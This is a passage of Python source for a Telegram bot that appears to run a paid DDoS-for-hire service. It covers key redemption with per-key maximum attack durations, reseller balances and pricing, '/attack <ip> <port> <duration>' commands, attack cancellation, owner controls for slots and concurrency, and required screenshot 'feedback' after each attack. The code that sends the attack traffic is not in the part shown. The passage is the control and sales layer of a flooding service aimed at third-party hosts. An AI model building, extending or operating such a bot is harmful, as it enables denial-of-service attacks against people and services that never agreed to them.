            response += f"   {label:<12} ➜  {price} Rꜱ\n"
    
    response += "\n═══════════════════════════\n"
    response += f"{pe('star','⭐')} VIP Mᴀx Aᴛᴛᴀᴄᴋ: {get_key_max_attack('VIP')}ꜱ\n"
    response += f"{pe('star','📀')} NORMAL Mᴀx Aᴛᴛᴀᴄᴋ: {get_key_max_attack('NORMAL')}ꜱ\n"
    response += "═══════════════════════════\n"
    response += f"{pe('chart','📋')} Usᴀɢᴇ: /gen (ᴛʜᴇɴ ᴄʜᴏᴏꜱᴇ ᴋᴇʏ ᴛʏᴘᴇ)\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /redeem &lt;ᴋᴇʏ&gt;", reply_to=message, parse_mode="HTML")
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴋᴇʏ!", reply_to=message, parse_mode="HTML")
        return
    
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc['used'] and current_users >= max_users:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴋᴇʏ ʜᴀꜱ ᴀʟʀᴇᴀᴅʏ ʙᴇᴇɴ ᴜꜱᴇᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    if key_doc.get('is_trail'):
        user_data = users_collection.find_one({'user_id': user_id})
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
            
            if abuse_count == 1:
                safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Wᴀʀɴɪɴɢ: Yᴏᴜ ᴄᴀɴɴᴏᴛ ᴇxᴛᴇɴᴅ ʏᴏᴜʀ ᴛɪᴍᴇ ᴡɪᴛʜ ᴀ ᴛʀᴀɪʟ ᴋᴇʏ! Aɴᴏᴛʜᴇʀ ᴀᴛᴛᴇᴍᴘᴛ ᴍᴀʏ ʀᴇꜱᴜʟᴛ ɪɴ ᴀ ʙᴀɴ.", reply_to=message, parse_mode="HTML")
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2))
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}
                )
                safe_send_message(message.chat.id, f"{pe('ban','🚫')} Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ʙᴀɴɴᴇᴅ ꜰᴏʀ {ban_minutes} ᴍɪɴᴜᴛᴇꜱ ᴅᴜᴇ ᴛᴏ ᴛʀᴀɪʟ ᴋᴇʏ ᴀʙᴜꜱᴇ!", reply_to=message, parse_mode="HTML")
            return

    user = users_collection.find_one({'user_id': user_id})
    
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    key_type = key_doc.get('key_type', 'NORMAL')
    max_attack_time = key_doc.get('max_attack_time', get_key_max_attack(key_type))
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }}
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        new_remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"{pe('check','✅')} Kᴇʏ Exᴛᴇɴᴅᴇᴅ!\n\n{pe('key','🔑')} Kᴇʏ: <code>{key_input}</code>\n{pe('star','⭐')} Tʏᴘᴇ: {key_type}\n{pe('timer','⏰')} Aᴅᴅᴇᴅ: {key_doc['duration_label']}\n{pe('hourglass','⏳')} Tᴏᴛᴀʟ Tɪᴍᴇ: {new_remaining}\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack_time}ꜱ", reply_to=message, parse_mode="HTML")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }},
            upsert=True
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"{pe('check','✅')} Kᴇʏ Rᴇᴅᴇᴇᴍᴇᴅ!\n\n{pe('key','🔑')} Kᴇʏ: <code>{key_input}</code>\n{pe('star','⭐')} Tʏᴘᴇ: {key_type}\n{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {key_doc['duration_label']}\n{pe('hourglass','⏳')} Tɪᴍᴇ Lᴇꜰᴛ: {remaining}\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack_time}ꜱ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀ ᴋᴇʏ!", reply_to=message, parse_mode="HTML")
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Kᴇʏ ᴇxᴘɪʀᴇᴅ!\n\n{pe('refresh','🔄')} Fᴏʀ ʀᴇɴᴇᴡᴀʟ DM: @{reseller_username}", reply_to=message, parse_mode="HTML")
        else:
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Kᴇʏ ᴇxᴘɪʀᴇᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    remaining = get_time_remaining(user_id)
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))
    
    safe_send_message(message.chat.id, f"{pe('key','🔑')} Kᴇʏ Dᴇᴛᴀɪʟꜱ\n\n{pe('target','📌')} Kᴇʏ: <code>{user['key']}</code>\n{pe('star','⭐')} Tʏᴘᴇ: {key_type}\n{pe('hourglass','⏳')} Rᴇᴍᴀɪɴɪɴɢ: {remaining}\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack}ꜱ\n{pe('check','✅')} Sᴛᴀᴛᴜꜱ: Aᴄᴛɪᴠᴇ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["cancel"])
def cancel_attack_command(message):
    user_id = message.from_user.id
    
    if check_banned(message): return
    
    with _attack_lock:
        found = False
        for attack_id, attack in list(active_attacks.items()):
            if attack.get('user_id') == user_id:
                del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]
                found = True
                break
        
        if found:
            safe_send_message(message.chat.id, f"{pe('check','✅')} Yᴏᴜʀ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ ʜᴀꜱ ʙᴇᴇɴ ᴄᴀɴᴄᴇʟʟᴇᴅ!", reply_to=message, parse_mode="HTML")
        else:
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜ ʜᴀᴠᴇ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ ᴛᴏ ᴄᴀɴᴄᴇʟ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["myaccess"])
def my_access_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀɴʏ ᴀᴄᴛɪᴠᴇ ᴀᴄᴄᴇꜱꜱ!", reply_to=message, parse_mode="HTML")
        return
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜʀ ᴀᴄᴄᴇꜱꜱ ʜᴀꜱ ᴇxᴘɪʀᴇᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    remaining = get_time_remaining(user_id)
    reseller_name = user.get('reseller_username', 'Nᴏɴᴇ')
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))
    
    access_msg = f"{pe('chart','📋')} Yᴏᴜʀ Aᴄᴄᴇꜱꜱ Dᴇᴛᴀɪʟꜱ\n\n{pe('key','🔑')} Kᴇʏ: <code>{user['key']}</code>\n{pe('star','⭐')} Tʏᴘᴇ: {key_type}\n{pe('hourglass','⏳')} Tɪᴍᴇ Lᴇꜰᴛ: {remaining}\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack}ꜱ\n{pe('briefcase','💼')} Rᴇꜱᴇʟʟᴇʀ: @{reseller_name}\n{pe('check','✅')} Sᴛᴀᴛᴜꜱ: Aᴄᴛɪᴠᴇ"
    
    safe_send_message(message.chat.id, access_msg, reply_to=message, parse_mode="HTML")

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    fb = get_pending_feedback(user_id, is_group, group_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id, is_group, group_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    safe_send_message(message.chat.id, 
        f"<b>{pe('check','✅')} Fᴇᴇᴅʙᴀᴄᴋ Rᴇᴄᴇɪᴠᴇᴅ!</b>\n\n"
        f"{pe('congrats','🎉')} Tʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ʏᴏᴜʀ ꜰᴇᴇᴅʙᴀᴄᴋ!\n\n"
        f"<b>{pe('lightning','⚡')} Yᴏᴜ ᴄᴀɴ ɴᴏᴡ ꜱᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ ᴜꜱɪɴɢ /attack ᴄᴏᴍᴍᴀɴᴅ.</b>",
        reply_to=message, parse_mode="HTML")
    
    attack_type = "Gʀᴏᴜᴘ" if is_group else "Pʀɪᴠᴀᴛᴇ"
    location = f"Gʀᴏᴜᴘ ID: {group_id}" if is_group else "Pʀɪᴠᴀᴛᴇ Cʜᴀᴛ"
    
    owner_msg = (
        f"📸 <b>Nᴇᴡ Aᴛᴛᴀᴄᴋ Fᴇᴇᴅʙᴀᴄᴋ</b>\n\n"
        f"<b>👤 Usᴇʀ:</b> {user_name}\n"
        f"<b>📛 Usᴇʀɴᴀᴍᴇ:</b> @{username if username else 'N/A'}\n"
        f"<b>🆔 ID:</b> <code>{user_id}</code>\n"
        f"<b>📍 Lᴏᴄᴀᴛɪᴏɴ:</b> {location}\n"
        f"<b>📊 Tʏᴘᴇ:</b> {attack_type}\n\n"
        f"<b>🎯 Tᴀʀɢᴇᴛ:</b> {fb['target']}:{fb['port']}\n"
        f"<b>⏱️ Dᴜʀᴀᴛɪᴏɴ:</b> {fb['duration']}ꜱ\n"
        f"<b>🕐 Tɪᴍᴇ:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
    )
    
    if FEEDBACK_CHANNEL_ID != 0:
        try:
            bot.send_photo(
                FEEDBACK_CHANNEL_ID, 
                message.photo[-1].file_id, 
                caption=owner_msg,
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"Fᴀɪʟᴇᴅ ᴛᴏ ꜰᴏʀᴡᴀʀᴅ ꜰᴇᴇᴅʙᴀᴄᴋ ᴛᴏ ᴄʜᴀɴɴᴇʟ: {e}")

    try:
        for owner in BOT_OWNER:
            bot.send_photo(
                owner, 
                message.photo[-1].file_id, 
                caption=owner_msg,
                parse_mode="HTML"
            )
    except Exception as e:
        print(f"Fᴀɪʟᴇᴅ ᴛᴏ ꜰᴏʀᴡᴀʀᴅ ꜰᴇᴇᴅʙᴀᴄᴋ ᴛᴏ ᴏᴡɴᴇʀ: {e}")

@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    set_setting('feedback_required', True)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Fᴇᴇᴅʙᴀᴄᴋ ʀᴇQᴜɪʀᴇᴍᴇɴᴛ Eɴᴀʙʟᴇᴅ! Usᴇʀꜱ ᴍᴜꜱᴛ ꜱᴇɴᴅ ꜰᴇᴇᴅʙᴀᴄᴋ ᴀꜰᴛᴇʀ ᴇᴀᴄʜ ᴀᴛᴛᴀᴄᴋ.", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["feedback_of"])
def feedback_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    set_setting('feedback_required', False)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Fᴇᴇᴅʙᴀᴄᴋ ʀᴇQᴜɪʀᴇᴍᴇɴᴛ Dɪꜱᴀʙʟᴇᴅ! Usᴇʀꜱ ᴄᴀɴ ᴀᴛᴛᴀᴄᴋ ᴡɪᴛʜᴏᴜᴛ ꜱᴇɴᴅɪɴɢ ꜰᴇᴇᴅʙᴀᴄᴋ.", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    help_text = f'''
{pe('crown','👑')} ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ

Usᴇ /config ᴛᴏ ᴏᴘᴇɴ ᴛʜᴇ ɪɴᴛᴇʀᴀᴄᴛɪᴠᴇ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ ᴘᴀɴᴇʟ.

{pe('chart','📋')} Qᴜɪᴄᴋ Cᴏᴍᴍᴀɴᴅꜱ:

{pe('warning','🚫')} IP Bʟᴏᴄᴋɪɴɢ:
★ /blockip [ᴘʀᴇꜰɪx] - Bʟᴏᴄᴋ IP ᴘʀᴇꜰɪx (ᴇɢ: /blockip 20.204)
★ /unblockip [ᴘʀᴇꜰɪx] - Uɴʙʟᴏᴄᴋ IP ᴘʀᴇꜰɪx
★ /blockedips - Lɪꜱᴛ ᴀʟʟ ʙʟᴏᴄᴋᴇᴅ IPꜱ

{pe('gear','⚙️')} Aᴛᴛᴀᴄᴋ Sᴇᴛᴛɪɴɢꜱ:
★ /setmaxslot [ꜱʟᴏᴛꜱ] - Sᴇᴛ ᴍᴀx ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱ ᴀᴛᴛᴀᴄᴋꜱ
★ /setconcurrent [ᴠᴀʟᴜᴇ] - Sᴇᴛ ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴘᴇʀ ᴀᴛᴛᴀᴄᴋ
★ /maxattack [ꜱᴇᴄ] - Sᴇᴛ ᴍᴀx ᴛɪᴍᴇ ꜰᴏʀ ɴᴏʀᴍᴀʟ ᴋᴇʏꜱ
★ /cooldown [ꜱᴇᴄ] - Sᴇᴛ ᴄᴏᴏʟᴅᴏᴡɴ

{pe('key','🔑')} Kᴇʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ:
★ /gen - Gᴇɴᴇʀᴀᴛᴇ ᴋᴇʏꜱ (ᴄʜᴏᴏꜱᴇ VIP/NORMAL)
★ /key [ᴋᴇʏ] - Kᴇʏ ᴅᴇᴛᴀɪʟꜱ
★ /allkeys - Aʟʟ ᴋᴇʏꜱ
★ /delkey [ᴋᴇʏ] - Dᴇʟᴇᴛᴇ ᴋᴇʏ
★ /delexpkey - Dᴇʟᴇᴛᴇ ᴇxᴘɪʀᴇᴅ ᴋᴇʏꜱ
★ /trail [ʜʀꜱ] [ᴍᴀx] - Tʀᴀɪʟ ᴋᴇʏꜱ

{pe('profile','👥')} Usᴇʀ Mᴀɴᴀɢᴇᴍᴇɴᴛ:
★ /allusers - Aʟʟ ᴜꜱᴇʀꜱ
★ /extend [ɪᴅ] [ᴛɪᴍᴇ] - Exᴛᴇɴᴅ ᴛɪᴍᴇ
★ /extendall [ᴛɪᴍᴇ] - Exᴛᴇɴᴅ ᴇᴠᴇʀʏᴏɴᴇ'ꜱ ᴛɪᴍᴇ
★ /down [ɪᴅ] [ᴛɪᴍᴇ] - Rᴇᴅᴜᴄᴇ ᴛɪᴍᴇ
★ /ban [ɪᴅ] - Bᴀɴ ᴜꜱᴇʀ
★ /unban [ɪᴅ] - Uɴʙᴀɴ ᴜꜱᴇʀ
★ /tban [ɪᴅ] [ᴛɪᴍᴇ] - Tᴇᴍᴘ ʙᴀɴ

{pe('briefcase','💼')} Rᴇꜱᴇʟʟᴇʀ Mᴀɴᴀɢᴇᴍᴇɴᴛ:
★ /add_reseller [ɪᴅ] - Aᴅᴅ ʀᴇꜱᴇʟʟᴇʀ
★ /remove_reseller [ɪᴅ] - Rᴇᴍᴏᴠᴇ ʀᴇꜱᴇʟʟᴇʀ
★ /block_reseller [ɪᴅ] - Bʟᴏᴄᴋ
★ /unblock_reseller [ɪᴅ] - Uɴʙʟᴏᴄᴋ
★ /all_resellers - Aʟʟ ʀᴇꜱᴇʟʟᴇʀꜱ
★ /saldoadd [ɪᴅ] [ᴀᴍᴛ] - Aᴅᴅ ʙᴀʟᴀɴᴄᴇ
★ /saldoremove [ɪᴅ] [ᴀᴍᴛ] - Rᴇᴍᴏᴠᴇ ʙᴀʟᴀɴᴄᴇ
★ /saldo [ɪᴅ] - Cʜᴇᴄᴋ ʙᴀʟᴀɴᴄᴇ

{pe('briefcase','👥')} Gʀᴏᴜᴘ Mᴀɴᴀɢᴇᴍᴇɴᴛ:
★ /addgrp [ɴᴀᴍᴇ] [ɢʀᴏᴜᴘ_ɪᴅ] [ᴅᴀʏꜱ] - Aᴘᴘʀᴏᴠᴇ ɢʀᴏᴜᴘ
★ /delgrp [ɴᴀᴍᴇ] - Rᴇᴍᴏᴠᴇ ɢʀᴏᴜᴘ ᴀᴘᴘʀᴏᴠᴀʟ
★ /grpinfo - Lɪꜱᴛ ᴀᴘᴘʀᴏᴠᴇᴅ ɢʀᴏᴜᴘꜱ
★ /setgrp [ɢʀᴏᴜᴘ_ɪᴅ] [ꜱᴇᴛᴛɪɴɢ] [ᴠᴀʟᴜᴇ] - Cᴏɴꜰɪɢᴜʀᴇ ɢʀᴏᴜᴘ (max_time, cooldown, max_slots, feedback)

{pe('announcement','📢')} Bʀᴏᴀᴅᴄᴀꜱᴛ:
★ /broadcast - Mᴇꜱꜱᴀɢᴇ ᴛᴏ ᴀʟʟ
★ /broadcastreseller - Mᴇꜱꜱᴀɢᴇ ᴛᴏ ʀᴇꜱᴇʟʟᴇʀꜱ
★ /broadcastpaid - Mᴇꜱꜱᴀɢᴇ ᴛᴏ ᴘᴀɪᴅ ᴜꜱᴇʀꜱ ᴏɴʟʏ

{pe('chart','📊')} Mᴏɴɪᴛᴏʀɪɴɢ:
★ /live - Sᴇʀᴠᴇʀ ꜱᴛᴀᴛꜱ
★ /logs - Aᴛᴛᴀᴄᴋ ʟᴏɢꜱ
★ /dellogs - Dᴇʟᴇᴛᴇ ᴀʟʟ ʟᴏɢꜱ

{pe('gear','🔧')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ:
★ /maintenance [ᴍꜱɢ] - Mᴀɪɴᴛᴇɴᴀɴᴄᴇ ON
★ /ok - Mᴀɪɴᴛᴇɴᴀɴᴄᴇ OFF

{pe('target','🔍')} API Hᴇᴀʟᴛʜ:
★ /apihealth - Cʜᴇᴄᴋ API ꜱᴛᴀᴛᴜꜱ (ʜɪᴅᴇꜱ API ᴋᴇʏ)
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        crown = pe('crown','👑')
        d = pe('diamond','🔸')
        help_text = f"""
{crown} Wᴇʟᴄᴏᴍᴇ Oᴡɴᴇʀ!

Usᴇ /owner ᴛᴏ ꜱᴇᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ ᴏʀ /config ꜰᴏʀ ɪɴᴛᴇʀᴀᴄᴛɪᴠᴇ ᴘᴀɴᴇʟ.

Bᴀꜱɪᴄ ᴄᴏᴍᴍᴀɴᴅꜱ:
{d} /attack &lt;ɪᴘ&gt; &lt;ᴘᴏʀᴛ&gt; &lt;ᴅᴜʀᴀᴛɪᴏɴ&gt; - Lᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ
{d} /status - Cʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ ꜱᴛᴀᴛᴜꜱ
{d} /cancel - Cᴀɴᴄᴇʟ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ
{d} /redeem &lt;ᴋᴇʏ&gt; - Rᴇᴅᴇᴇᴍ ᴀ ᴋᴇʏ
{d} /myaccess - Cʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ
{d} /id - Gᴇᴛ ʏᴏᴜʀ ID
"""
    elif is_reseller(user_id):
        wallet = pe('briefcase','💼')
        d = pe('diamond','🔸')
        help_text = f"""
{wallet} Rᴇꜱᴇʟʟᴇʀ Pᴀɴᴇʟ

Cᴏᴍᴍᴀɴᴅꜱ:
{d} /attack &lt;ɪᴘ&gt; &lt;ᴘᴏʀᴛ&gt; &lt;ᴅᴜʀᴀᴛɪᴏɴ&gt; - Lᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ
{d} /redeem &lt;ᴋᴇʏ&gt; - Rᴇᴅᴇᴇᴍ ᴀ ᴋᴇʏ
{d} /status - Cʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ ꜱᴛᴀᴛᴜꜱ
{d} /cancel - Cᴀɴᴄᴇʟ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ
{d} /myaccess - Cʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ
{d} /id - Gᴇᴛ ʏᴏᴜʀ ID
{d} /mysaldo - Cʜᴇᴄᴋ ʏᴏᴜʀ ʙᴀʟᴀɴᴄᴇ
{d} /prices - Vɪᴇᴡ ᴋᴇʏ ᴘʀɪᴄᴇꜱ
{d} /gen - Gᴇɴᴇʀᴀᴛᴇ ᴋᴇʏꜱ
"""
    else:
        d = pe('diamond','🔸')
        cam = pe('camera','📸')
        help_text = f"""
{pe('chart','📚')} Aᴠᴀɪʟᴀʙʟᴇ Cᴏᴍᴍᴀɴᴅꜱ:

{d} /start - Sᴛᴀʀᴛ ɪɴᴛᴇʀᴀᴄᴛɪɴɢ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ
{d} /attack &lt;ɪᴘ&gt; &lt;ᴘᴏʀᴛ&gt; &lt;ᴅᴜʀᴀᴛɪᴏɴ&gt; - Lᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ
{d} /redeem &lt;ᴋᴇʏ&gt; - Rᴇᴅᴇᴇᴍ ᴀ ᴋᴇʏ
{d} /status - Cʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ ꜱᴛᴀᴛᴜꜱ
{d} /cancel - Cᴀɴᴄᴇʟ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ
{d} /myaccess - Cʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ
{d} /id - Gᴇᴛ ʏᴏᴜʀ ID

{cam} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ: Aꜰᴛᴇʀ ᴇᴀᴄʜ ᴀᴛᴛᴀᴄᴋ, ʏᴏᴜ ᴍᴜꜱᴛ ꜱᴇɴᴅ ᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.
"""
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        crown = pe('crown','👑')
        response = f"""{crown} Wᴇʟᴄᴏᴍᴇ Oᴡɴᴇʀ, {user_name}!

Usᴇ /owner ᴛᴏ ꜱᴇᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ ᴏʀ /config ꜰᴏʀ ɪɴᴛᴇʀᴀᴄᴛɪᴠᴇ ᴘᴀɴᴇʟ.
Usᴇ /help ᴛᴏ ꜱᴇᴇ ʙᴀꜱɪᴄ ᴄᴏᴍᴍᴀɴᴅꜱ."""
    elif is_reseller(user_id):
        wallet = pe('briefcase','💼')
        response = f"""{wallet} Wᴇʟᴄᴏᴍᴇ Rᴇꜱᴇʟʟᴇʀ, {user_name}!

Usᴇ /help ᴛᴏ ꜱᴇᴇ ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅꜱ."""
    else:
        d = pe('diamond','🔸')
        cam = pe('camera','📸')
        response = f"""👋 Wᴇʟᴄᴏᴍᴇ, {user_name}!

Hᴇʀᴇ ᴀʀᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ:

{d} /start - Sᴛᴀʀᴛ ɪɴᴛᴇʀᴀᴄᴛɪɴɢ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ.
{d} /attack &lt;ɪᴘ&gt; &lt;ᴘᴏʀᴛ&gt; &lt;ᴅᴜʀᴀᴛɪᴏɴ&gt; - Lᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ.
{d} /redeem &lt;ᴋᴇʏ&gt; - Rᴇᴅᴇᴇᴍ ᴀ ᴋᴇʏ.
{d} /status - Cʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ ꜱᴛᴀᴛᴜꜱ.
{d} /cancel - Cᴀɴᴄᴇʟ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ.
{d} /myaccess - Cʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ.
{d} /id - Gᴇᴛ ʏᴏᴜʀ ID.

{cam} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ: Aꜰᴛᴇʀ ᴇᴀᴄʜ ᴀᴛᴛᴀᴄᴋ, ʏᴏᴜ ᴍᴜꜱᴛ ꜱᴇɴᴅ ᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.
"""
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    
    cpu_overall = psutil.cpu_percent(interval=0.1)
